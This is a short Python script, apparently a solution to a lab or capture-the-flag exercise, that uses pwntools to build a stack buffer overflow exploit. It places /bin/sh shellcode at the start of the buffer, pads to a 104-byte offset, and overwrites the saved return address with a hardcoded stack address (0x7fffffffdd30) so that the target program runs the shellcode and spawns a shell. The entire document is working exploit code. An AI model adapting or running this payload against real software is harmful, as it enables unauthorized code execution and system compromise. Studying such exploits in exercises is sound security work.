#!/usr/bin/env python3
from struct import *
from pwn import *

# Set the architecture context to 64-bit
context.arch = 'amd64'

# Generate the shellcode for /bin/sh
shellcode = asm(shellcraft.sh())

# The offset to the return address in the buffer
buffer_offset = 104  # You need to overwrite the return address, which is at this offset

# Create the payload
payload = b''

# First, add the shellcode at the beginning of the buffer
payload += shellcode

# Padding to reach the return address (104 bytes for RIP overwrite)
payload += b'A' * (buffer_offset - len(payload))

# The address where we want the program to jump to (the start of the shellcode)
# In this case, we assume the shellcode will be loaded at 0x7fffffffdd30
return_address = 0x7fffffffdd30  # Adjust this based on where the shellcode lands in memory

# Add the return address (little-endian format)
payload += p64(return_address)

# Write the payload to a file
with open("payload5", "wb") as f:
    f.write(payload)

# Optionally, print the payload for inspection
print(payload.hex())
